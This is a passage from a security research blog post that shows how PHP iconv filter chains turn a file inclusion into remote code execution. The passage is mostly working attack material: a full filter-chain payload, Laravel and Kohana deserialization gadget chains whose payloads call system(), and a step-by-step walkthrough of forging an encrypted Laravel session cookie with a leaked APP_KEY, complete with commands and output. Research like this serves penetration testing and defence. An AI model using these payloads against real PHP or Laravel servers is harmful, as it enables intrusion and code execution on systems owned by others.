IFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

php -r "require('php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp');"
phpinfo()
PHP Version => 7.4.30
[...] php.net.ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½@Cï¿½ï¿½ï¿½ï¿½ï¿½ï¿½>==ï¿½
```

The script can be found on the following repository: [**[GITHUB-SYN-PHP-FILTER-GENERATOR]**](https://github.com/synacktiv/php_filter_chain_generator). Feel free to use it and to ask for new features.

### PHP Translit

Since our chains are entirely based on the PHP `iconv` function, it was interesting to dig a bit to see if it would be possible to derive other usages from `iconv`. The documentation gives details on a way to translit or ignore characters from one encoding to another.

> `to_encoding`
>
>
> The desired encoding of the result.
>
>
> If the string `//TRANSLIT` is appended to `to_encoding`, then transliteration is activated. This means that when a character can't be represented in the target charset, it may be approximated through one or several similarly looking characters. If the string `//IGNORE` is appended, characters that cannot be represented in the target charset are silently discarded. Otherwise, **`E_NOTICE`** is generated and the function will return **`false`**.

By playing with URL encoding, it was possible to also use this feature on our chains!

```

$ echo -n -e 'â¬' > test.txt

$ php -r "echo file_get_contents('php://filter/convert.iconv.utf8.\'ISO-8859-1%2F%2FTRANSLIT%2F%2FIGNORE\'/resource=test.txt');"
EUR
```

However, since it requires many characters, it was considered more efficient to not translit in our PHP filter chains.

# Turning the Laravel file inclusion gadget chain into remote code execution

## New code execution POP chain on Laravel framework

Now that `iconv` filter chains are a bit demystified, let's get back on our horses. Since we can now transform any file inclusion primitive into remote code execution, let's upgrade our initially discovered *Laravel* gadget chain.

![POP chain on laravel/framework 9.34.0](../../sites/default/files/inline-images/laravel_gadget_0.png)

Final RCE gadget chain on laravel/framework 9.34.0.

The final PHP gadget chain looks as follows:

```

<?php

namespace Illuminate\Routing;

class RouteFileRegistrar
{
    protected $router;
    public function __construct(){
        $this->router[0] = "system";
        $this->router[1] = "id; ls -lisah";
    }
}

class PendingResourceRegistration
{
    protected $registrar;
    protected $name;
    protected $controller;
    protected $options;
    protected $registered;

    public function __construct(){
        $this->registrar = new RouteFileRegistrar();
        //<?=call_user_func($router[0], $router[1]);   ?>
        $this->name = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|[...]|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp";
        $this->controller = "test.php";
        $this->options = [];
        $this->registered = false;
    }
}

$test= serialize(new PendingResourceRegistration());
echo base64_encode(serialize(new PendingResourceRegistration()));
echo "\n";
```
## Using the new pop-chain to actually execute code on a Laravel instance

That's really sweet but feels situational, doesn't it? Let's kill two birds with one stone and use this bug on a real-world application configured with *Laravel*.

We are searching for a deserialization primitive. We can get it if the following prerequisites are met:

* Exfiltrate the `APP_KEY` value contained in the `.env` file at the root of a *Laravel* project.
* Make sure the `SESSION_DRIVER` configuration is set to the value `cookie`, meaning the user session is stored encrypted in the user cookie.

It has to be noted that the last point is unlikely to happen nowadays, since *Laravel* sessions are now stored in files by default. However, for compatibility issues, it is still available, and this configuration can still be used on the latest *Laravel* versions [**[LARAVEL-SESSION-CONFIG]**](https://laravel.com/docs/9.x/session#configuration).

Another CLI to encrypt/decrypt this kind of cookies named *laravel\_cookie\_killer* was developed for this proof of concept and is available on the following repository: [**[GITHUB-SYN-LARAVEL-COOKIE-KILLER]**](https://github.com/synacktiv/laravel_cookie_killer). Once again, feel free to use it and to ask for new features.

So let's imagine we just leaked the following `.env` file from a *Laravel* project:

```

APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:whZhGx+gWV2LEN+ncYxJskxrF/hDVCGc3UdE4vmiF8w=
APP_DEBUG=false
[...]
SESSION_DRIVER=cookie
[...]
```

It is then possible to decrypt the cookie and see if it stores serialized user data.

```

python3 laravel_cookie_killer.py -d -k whZhGx+gWV2LEN+ncYxJskxrF/hDVCGc3UdE4vmiF8w= -c eyJpdiI6IlgzTjB0UGUwTmQ4VVluSEVRMThKSVE9PSIsInZhbHVlIjoiS1FGZVNvaSticU8yNzVoZ0NVdlpSemN3V05BNWV4VzVHSDA5OXBsUWQ1QjZRMkhSN2E1OTQ1d2dPdm1PaWFxQkVMMXpaZzZjbGFJRXhRRzB3czlLVkdES0NiOTlxcVA1enVMcmNyazROWDZQNXg5dHAxRERkWStRTFVWMS83NmJOd011TEJWeFE3SVYycERPUEMyTmRPMktoand6N3VTMjUvSHVka3pBQ3VuSmk4TkJVSWpTZUt3Zjh4TG1jdjZlY1I2ZmZiSFFqdFBCdHFsS0ltL1hmbVFEYWVIV1RJd05oK3lxRktvaWhLT2lJZGRDMUhzdzliQm5NTnJCREJGbWx4T25VbjY0QUk5b3B1K1lsaDNhMWZFK2g5U3ZsU3JGR1F6c0xHQmJOSWFJYWozbS84RnNWcGt4dHZTSGNwbUVJKzNOR2R6YWJWTEpiNFA3ZDQzcTBYREpNbzdYc1RuWGlQWVNGZnJZckNGcDNpMWxDRlZIRkxuYUpXRkVyYnJva0tQYThIclB3L01mRTR3UmJucEorNGZFNGpOejNCdmhyWE1obml0MWJydXdYdGZ0RWcyWkhMeWcwM3dFbGZLNlNoUlhBVm1vSnNDK3RKb094WHJhRy9Fb2FzRzIzNlgwNVdCdFV3ak1WaGRtdmNNV2N2d3ptVHBabzg2OXQzcWVTQXErTTlqdkpjVkhvVlBYcnk0M1NOZ010ckxHMUtSYS9ML25sQUcrN2F6YUhqMi9tZ0RwZDcrNkN6dzFSUStSRFVYNWpyQlNWTzJVM0wySUFoK3luWVFjakRaaHc3OG5xRTl3YktuUmtzRHRtSy81Ry9pL2hYZkdFekNYSm1KQUtPOXo2ZWdFQ0ZaNmsyemN6TjJ4TWpzSkQxd0VrWnkrS3V6Q3RWSExsRmVjVm1UK0dKbnBub0E4RFB6K2JEU201YUNPUmdkN1hHZ3hDRmlqamdCMnN4RnhxT3lESlhLQTB5aUVmSWJUdytCV3c0bzE1TXpDVU40MUhZN3ArNHM1WDFRUURBQ2s5aGxQam9seElzV3pmWGczaWVIVXNpZDFVK0VBcFhXMllialRoNEFHMU1yTnE0a3FYVjNpWjRBdVZpUk5KdnpaajZkTXFhL00vZnlXUjZBT2JMZDFrbjlmMkU0eGxlMXcra0JvbTFDakhYNWNvTUNuOFBIclZpRnRUZnd5UzdvMEVlUStmSVczWEV5V3QrRGc5OTFGUDZIUDkvU0VnYnlTNy9wa3JJYlIyaU1IMGlUeitMUkJDb0tSa1o3bFlybXFqVUtNWGh3MWFTK21VS2t0Y3ZaZ3NEYzB0R1hRSk9BOUVBQnVyNUpCdnpDSUZ0cGJ6VWVmeU9zYkxqNS9JNDliYk5WN3p0Qmcyc0dKUkxpTDRLRTNxWXI4YS9vNEM2Tkg0bUVOalM5VlNuYmRJdHkra1oxK1Nranh1ZnNzN1lDbW1PZUNHQzJQQ25CbFpDeTNPRXlRdmdzUzNjTnNWdkJLc1lsWWRITHpZM2JUWGhPMmdKQlQvOHdaQ0NkOWtta01Qa2tGTzFMNS9CeUVSeGVTbWNtRVh1VzZCRkJ2THBlUEJ2cSs3WTFsTHhsWjdSVVZKbHdjN29pSC83UzBJZ2RyUkl1cWJ2czd2ZmVOQkZWbDZIVmw1OGUyNFNMTHJVMzJZd0hIcHplbHA1akxuMXRRSG9tZlRYTjFidENJUjZkdXcwb04yRi9lZEVTcVNNa1d6czlESEt5R1dXb0IvSnFWQ2J1d1hiVitFQ1N0cEZHWG0vak5sNlAwMjR1NzVkdDVudlpWNDcwamlrK1hqOE5NSXNXYzRjNmVOeHFNTk0raFlPemUxRXFnZEFTNTRZNFpoMHd5YnpKN0NDbEltc2ttWi9VaHBsbFp3T0x0QUd2UFk3bGg3dm5NQ1VJRm8rVzBwMzZnaDg0RnZZazNkMHMyYmV1cnhFaWMwcE9oRmpxMUJoci9xOGtaK09rVFNuc2swQzhVWjdMbVZlVUhrekJtOHl4TDhGQWV4T29RMVF6Z3h6NkR1S0xHS1NOalFUTUtScUpLajF4VFFGbzRYY3RBNmIvY2luUU9pQVcrK3c4QnZnWkNiWUxPbUFJU2d2MUpRUkt0QlQ0N0VLSkRFMG5zeUNNdkJGaUNvaks2ZnNlL0tXVEYxWmRJeXdyU1lTNHI2VDAzZEVaN0VCc0VYUkI0NWcwVXpPMlE4RE5KTldlV05rejZXMkQxaFRobDZ1SE5EL1lvQzViTGFWa3RlbENnaC9RQmpMVlptMjFFYk40QzNvMHM0MUZoS24zSDF4Q2pEUThjWUhqVHh1cCs2UVAwVXNIYVI5eDRJeGM2eEJ5YXc1NGtJZ1VsYS9QRnFKUk44azh0YWdDUFUwVU1ZQlFQNWFKU0MzNW9iZXpBZnd5QStDeEc4MEVBOStsOWNxY21mdnowVU5jWVRIeXc3elIzdWRMUEtkWUhvdnhOV1ZaNy9haHpYMjNwZ1J1NkhTcytRbHV3djZRMThUU2h2aEJIbmNkbk9yL3VnOFpqdVJIQTFETTRnblh1K0I5c3VncUZ0Q3NrTEF6Z3lQOExUSkdDMEk4Nk94c2tZaGxySVBUYU53N2VxZlRROVJBVFJWNEFtaUNVQ08wQkRpN2ZzWWdYendRbFB6RWNhdkpoaUtPVk44cEF3OWpmRGRIYUQ0N2dScTgxSWlOejl1RGszcnRyUU9DZXZJcXNpR04xQkhPR2gzd013UHhta2NqakZERUQ2UU9PaEh4Mm1YUDFZL3F4RWxtMW9ZNUUxY3pob3hWWGg5dnFDV1RpMkVKU2RidUFCbDZTSlYxdnAvUTMwTmNRak1nYzhhZzJSZElaOUxvM0lZcFJOVmdJaEY1UDJ6Y0NqaFhmY0dzQ2hjWFdLdUFKSUFWYUZIaVBVU1EwTlJnMWtNZ3I3RjF6SzFvNG9IOHU5UEk9IiwibWFjIjoiMjJiODU4ZDA5Mjg4N2VlODI1ZWY2N2VjN2U2ODM2NzkyZGFkZjJkNGJjNzNhMzU3MDlhYTlhZDgzMTg3YTE1OCIsInRhZyI6IiJ9
[*] uncyphered string
2409b529f14153e84a20b432fbe13f9da74dbe3f|{"data":"a:4:{s:6:\"_token\";s:40:\"0o8Mxir9U9BTK3iQqKyq2I01jYOqPeDeEIDTKF9o\";s:4:\"test\";O:15:\"App\\Models\\User\":32:{s:13:\"\u0000*\u0000connection\";N;s:8:\"\u0000*\u0000table\";N;s:13:\"\u0000*\u0000primaryKey\";s:2:\"id\";s:10:\"\u0000*\u0000keyType\";s:3:\"int\";s:12:\"incrementing\";b:1;s:7:\"\u0000*\u0000with\";a:0:{}s:12:\"\u0000*\u0000withCount\";a:0:{}s:19:\"preventsLazyLoading\";b:0;s:10:\"\u0000*\u0000perPage\";i:15;s:6:\"exists\";b:0;s:18:\"wasRecentlyCreated\";b:0;s:28:\"\u0000*\u0000escapeWhenCastingToString\";b:0;s:13:\"\u0000*\u0000attributes\";a:0:{}s:11:\"\u0000*\u0000original\";a:0:{}s:10:\"\u0000*\u0000changes\";a:0:{}s:8:\"\u0000*\u0000casts\";a:1:{s:17:\"email_verified_at\";s:8:\"datetime\";}s:17:\"\u0000*\u0000classCastCache\";a:0:{}s:21:\"\u0000*\u0000attributeCastCache\";a:0:{}s:8:\"\u0000*\u0000dates\";a:0:{}s:13:\"\u0000*\u0000dateFormat\";N;s:10:\"\u0000*\u0000appends\";a:0:{}s:19:\"\u0000*\u0000dispatchesEvents\";a:0:{}s:14:\"\u0000*\u0000observables\";a:0:{}s:12:\"\u0000*\u0000relations\";a:0:{}s:10:\"\u0000*\u0000touches\";a:0:{}s:10:\"timestamps\";b:1;s:9:\"\u0000*\u0000hidden\";a:2:{i:0;s:8:\"password\";i:1;s:14:\"remember_token\";}s:10:\"\u0000*\u0000visible\";a:0:{}s:11:\"\u0000*\u0000fillable\";a:3:{i:0;s:4:\"name\";i:1;s:5:\"email\";i:2;s:8:\"password\";}s:10:\"\u0000*\u0000guarded\";a:1:{i:0;s:1:\"*\";}s:20:\"\u0000*\u0000rememberTokenName\";s:14:\"remember_token\";s:14:\"\u0000*\u0000accessToken\";N;}s:9:\"_previous\";a:1:{s:3:\"url\";s:22:\"http:\/\/localhost.:8000\";}s:6:\"_flash\";a:2:{s:3:\"old\";a:0:{}s:3:\"new\";a:0:{}}}","expires":1665348091}
[*] Base64 encoded uncyphered version
b'MjQwOWI1MjlmMTQxNTNlODRhMjBiNDMyZmJlMTNmOWRhNzRkYmUzZnx7ImRhdGEiOiJhOjQ6e3M6NjpcIl90b2tlblwiO3M6NDA6XCIwbzhNeGlyOVU5QlRLM2lRcUt5cTJJMDFqWU9xUGVEZUVJRFRLRjlvXCI7czo0OlwidGVzdFwiO086MTU6XCJBcHBcXE1vZGVsc1xcVXNlclwiOjMyOntzOjEzOlwiXHUwMDAwKlx1MDAwMGNvbm5lY3Rpb25cIjtOO3M6ODpcIlx1MDAwMCpcdTAwMDB0YWJsZVwiO047czoxMzpcIlx1MDAwMCpcdTAwMDBwcmltYXJ5S2V5XCI7czoyOlwiaWRcIjtzOjEwOlwiXHUwMDAwKlx1MDAwMGtleVR5cGVcIjtzOjM6XCJpbnRcIjtzOjEyOlwiaW5jcmVtZW50aW5nXCI7YjoxO3M6NzpcIlx1MDAwMCpcdTAwMDB3aXRoXCI7YTowOnt9czoxMjpcIlx1MDAwMCpcdTAwMDB3aXRoQ291bnRcIjthOjA6e31zOjE5OlwicHJldmVudHNMYXp5TG9hZGluZ1wiO2I6MDtzOjEwOlwiXHUwMDAwKlx1MDAwMHBlclBhZ2VcIjtpOjE1O3M6NjpcImV4aXN0c1wiO2I6MDtzOjE4Olwid2FzUmVjZW50bHlDcmVhdGVkXCI7YjowO3M6Mjg6XCJcdTAwMDAqXHUwMDAwZXNjYXBlV2hlbkNhc3RpbmdUb1N0cmluZ1wiO2I6MDtzOjEzOlwiXHUwMDAwKlx1MDAwMGF0dHJpYnV0ZXNcIjthOjA6e31zOjExOlwiXHUwMDAwKlx1MDAwMG9yaWdpbmFsXCI7YTowOnt9czoxMDpcIlx1MDAwMCpcdTAwMDBjaGFuZ2VzXCI7YTowOnt9czo4OlwiXHUwMDAwKlx1MDAwMGNhc3RzXCI7YToxOntzOjE3OlwiZW1haWxfdmVyaWZpZWRfYXRcIjtzOjg6XCJkYXRldGltZVwiO31zOjE3OlwiXHUwMDAwKlx1MDAwMGNsYXNzQ2FzdENhY2hlXCI7YTowOnt9czoyMTpcIlx1MDAwMCpcdTAwMDBhdHRyaWJ1dGVDYXN0Q2FjaGVcIjthOjA6e31zOjg6XCJcdTAwMDAqXHUwMDAwZGF0ZXNcIjthOjA6e31zOjEzOlwiXHUwMDAwKlx1MDAwMGRhdGVGb3JtYXRcIjtOO3M6MTA6XCJcdTAwMDAqXHUwMDAwYXBwZW5kc1wiO2E6MDp7fXM6MTk6XCJcdTAwMDAqXHUwMDAwZGlzcGF0Y2hlc0V2ZW50c1wiO2E6MDp7fXM6MTQ6XCJcdTAwMDAqXHUwMDAwb2JzZXJ2YWJsZXNcIjthOjA6e31zOjEyOlwiXHUwMDAwKlx1MDAwMHJlbGF0aW9uc1wiO2E6MDp7fXM6MTA6XCJcdTAwMDAqXHUwMDAwdG91Y2hlc1wiO2E6MDp7fXM6MTA6XCJ0aW1lc3RhbXBzXCI7YjoxO3M6OTpcIlx1MDAwMCpcdTAwMDBoaWRkZW5cIjthOjI6e2k6MDtzOjg6XCJwYXNzd29yZFwiO2k6MTtzOjE0OlwicmVtZW1iZXJfdG9rZW5cIjt9czoxMDpcIlx1MDAwMCpcdTAwMDB2aXNpYmxlXCI7YTowOnt9czoxMTpcIlx1MDAwMCpcdTAwMDBmaWxsYWJsZVwiO2E6Mzp7aTowO3M6NDpcIm5hbWVcIjtpOjE7czo1OlwiZW1haWxcIjtpOjI7czo4OlwicGFzc3dvcmRcIjt9czoxMDpcIlx1MDAwMCpcdTAwMDBndWFyZGVkXCI7YToxOntpOjA7czoxOlwiKlwiO31zOjIwOlwiXHUwMDAwKlx1MDAwMHJlbWVtYmVyVG9rZW5OYW1lXCI7czoxNDpcInJlbWVtYmVyX3Rva2VuXCI7czoxNDpcIlx1MDAwMCpcdTAwMDBhY2Nlc3NUb2tlblwiO047fXM6OTpcIl9wcmV2aW91c1wiO2E6MTp7czozOlwidXJsXCI7czoyMjpcImh0dHA6XC9cL2xvY2FsaG9zdC46ODAwMFwiO31zOjY6XCJfZmxhc2hcIjthOjI6e3M6MzpcIm9sZFwiO2E6MDp7fXM6MzpcIm5ld1wiO2E6MDp7fX19IiwiZXhwaXJlcyI6MTY2NTM0ODA5MX0DAwM='
```

If the cookie stores serialized data, we can generate our gadget using the laravel\_cookie\_payload.php script:

```

php laravel_cookie_payload.php
Tzo0NjoiSWxsd[...]mVnaXN0ZXJlZCI7YjowO30=
```

Finally, we inject the payload and encrypt the cookie back.

```

python3 laravel_cookie_killer.py -e -k whZhGx+gWV2LEN+ncYxJskxrF/hDVCGc3UdE4vmiF8w= --hash 2409b529f14153e84a20b432fbe13f9da74dbe3f -v -v Tzo0NjoiSWxsdW1pbm[...]jowO30=
O:46:\"Illuminate\\Routing\\PendingResourceRegistration\":5:{s:12:\"\u0000*\u0000registrar\";O:37:\"Illuminate\\Routing\\RouteFileRegistrar\":1:{s:9:\"\u0000*\u0000router\";a:2:{i:0;s:6:\"system\";i:1;s:9:\"ls -lisah\";}}s:7:\"\u0000*\u0000name\";s:11613:\"php:\/\/filter\/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|[...]|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode\/resource=php://temp\";s:13:\"\u0000*\u0000controller\";s:8:\"test.php\";s:10:\"\u0000*\u0000options\";a:0:{}s:13:\"\u0000*\u0000registered\";b:0;}
b'eyJpdiI6ICI4cHY5dTNR[...]ICJ0YWciOiAiIn0='
```

All there is to do then is to set the cookie with the one we just generated.

![Generate cookie laravel](../../sites/default/files/inline-images/cookie_laravel1.png)

Generating a cookie on *Laravel*.

Â

![Use the laravel cookie to RCE](../../sites/default/files/inline-images/cookie_laravel2.png)

Rewriting the *Laravel* cookie to get RCE.

The main weakness of using PHP filter chains is the resulting payload size (~ 14Ko in the previous case). Indeed, the default Apache2 configuration only allows a maximum of 8Ko of data in headers, thus preventing the exploitation. NGINX however, is more permissive and allows 16Ko headers by default. Finally, we believe the generated payloads can still be optimized, so a 14Ko payload would become smaller in the future

## Another use case: upgrading Kohana file include POP chain to RCE

A bit more research was performed to see if PHP filters could be used on already existing *phpggc* unserialize chains.

At the moment, the only PHP gadget chain on *phpggc* used to get a file include is based on *Kohana*, which is an outdated PHP framework maintained between 2007 and 2016.

Since PHP filters allows us to get RCE from `include` or `require`, we digged a little on this chain for fun, hoping to see these functions used instead of a `file_get_contents`.

It turned out it was worth it, the chain is based on `include` ! By using our newly discovered trick with filter chains, it was possible to upgrade the gadget from arbitrary file include to code execution. The chain looks as follows:

```

<?php

class View
{
    protected $_file;
    protected $_data;

    public function __construct() {
        $this->_data['a'] = "system";
        $this->_data['b'] = "id; ls -lisah";
        //<?=call_user_func($kohana_view_data['a'], $kohana_view_data['b']) ;?\>
        $this->_file = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|[...]|convert.base64-decode/resource=php://temp";
    }
}

$view = new View();

echo base64_encode(serialize($view));
```

To better understand what the steps followed by the chain are, this diagram summarizes the code flow used to get RCE.

![kohana gadget chain 3.3.6.](../../sites/default/files/inline-images/kohana_gadget.png)

*Kohana* RCE gadget chain on version 3.3.6.

Â

While upgrading this chain, we saw this related comment. It turned out that the owner of the repository *@cfreal\_* suggested creating an "include" type for gadget chains since you can get code execution from it if the required conditions are all filled [**[PHPGGC-COMMENT]**](https://github.com/ambionics/phpggc/pull/112).

![include chain quote](../../sites/default/files/inline-images/include_chain.png)

Comment refering to "*include*" gadget chains on *phpggc*.

From what we saw on this blog post, PHP filters should be sufficiently efficient to reach RCE from include/require in most cases.

## Last opinion on PHP filters exploitation

As we could see on this article, PHP filters can be really powerful if used in the right context. Their exploitation is fascinating as it is based on a few uncommon PHP tricks.

However, it is important to keep in mind that this kind of payload is really gigantic and won't be usable 100% of the time. The size limit of a header or in a URL can be problematic if the payload is too big.

This research entirely started because of research on POP chains. Doing so to exploit unserialization is an excellent way to understand how many PHP tricks work! We think it is a perfect way to step up quickly on code analysis, thus we encourage anyone to have a try with it.

Elevating a file inclusion primitive to a remote code execution using the PHP filters trick has been successfully tested on PHP versions 8.1.11, 7.4.30 and 5.6.40.

## References

**[LOKNOP-GIST]** <https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d>

**[GYNVAEL-BLOGPOST]** <https://gynvael.coldwind.pl/?id=671>

**[LARAVEL-SESSION-CONFIG]** <https://laravel.com/docs/9.x/session#configuration>

**[WUPCO-GITHUB-REPO]** <https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT>

**[HACKTRICKS-LFI2RCE-FILTERS]** <https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters#improvements>

**[RFC-1557]** <https://www.rfc-editor.org/rfc/rfc1557.html>

**[RFC-2781]** <https://www.rfc-editor.org/rfc/rfc2781#section-3.2>

**[PHP-DOC-WRAPPER-CONVERT-ICONV]** <https://www.php.net/manual/en/filters.convert.php#filters.convert.iconv>

**[PHP-DOC-ICONV-FUNC]** <https://www.php.net/manual/fr/function.iconv.php>

**[EBCDIC-WIKI]** <https://en.wikipedia.org/wiki/EBCDIC>

**[OWASP-POP-chain]** <https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection>

**[PHPGGC-COMMENT]** <https://github.com/ambionics/phpggc/pull/112>

**[GITHUB-SYN-PHP-FILTER-GENERATOR]** <https://github.com/synacktiv/php_filter_chain_generator>

**[GITHUB-SYN-LARAVEL-COOKIE-KILLER]** <https://github.com/synacktiv/laravel_cookie_killer>

Share this article

## Other publications

[### Diving into ADB protocol internals (2/2)](diving-into-adb-protocol-internals-22)
Our previous article laid the groundwork for understanding the ADB protocol and its usage scenarios. It primarily focused on the TCP/IP communication between the ADB Client and the ADB Server. However
...

Corentin Liaud
- 16/12/2024 -
DÃ©veloppement
, Outils

[### Automated Network Security with Rust: Detecting and Blocking Port Scanners](automated-network-security-with-rust-detecting-and-blocking-port-scanners)
Did you ever wonder how IDS/IPS like Snort or Suricata were able to interact with the network stack of the Linux kernel ?
Do you also happen to like Rust ?
Well dear reader, this article is for you
...

ClÃ©ment Fleury
- 06/12/2024 -
DÃ©veloppement

[### Relaying Kerberos over SMB using krbrelayx](relaying-kerberos-over-smb-using-krbrelayx)
Kerberos authentication relay was once thought to be impossible, but multiple researchers have since proven otherwise. In a 2021 article, James Forshaw discussed a technique for relaying Kerberos over
...

Hugo Vincent
- 20/11/2024 -
Pentest

[![Home](../../sites/default/files/logo_synacktiv_blanc.png)](../../en "Home")

* [Who are we?](../the-company#who-we-are)
* [Our values](../the-company#our-values)
* [Agreements](../the-company#aggrement)
* [Our clients](../the-company#our-clients)
* [Our team](../our-team/back-office)

* [Back office](../our-team/back-office)
* [Pentest](../our-team/pentest)
* [Reverse](../our-team/reverse)
* [Development](../our-team/development)
* [Incident response (CSIRT)](../our-team/incident-response)

* [Philosophy](../join-us#philosophie)
* [Recruitment process](../join-us#recrutement)
* [Job offers/internships](../join-us#block-views-block-job-offer-list-view-block-1)

* [Kraqozorus](../products/kraqozorus)
* [Houdini](../products/houdini)
* [Disconet](../products/disconet)
* [Oursin](../products/oursin)
* [Leakozorus](../products/leakozorus)

* [Penetration test / red team](../features/penetration-test-red-team)
* [Security audit](../features/security-audit)
* [Reverse-engineering](../features/reverse-engineering)
* [Development](../our-team/development)
* [Incident response](../features/incident-response)

* [CSIRT Synacktiv](../csirt)

## Contact us

+33 1 45 79 74 75

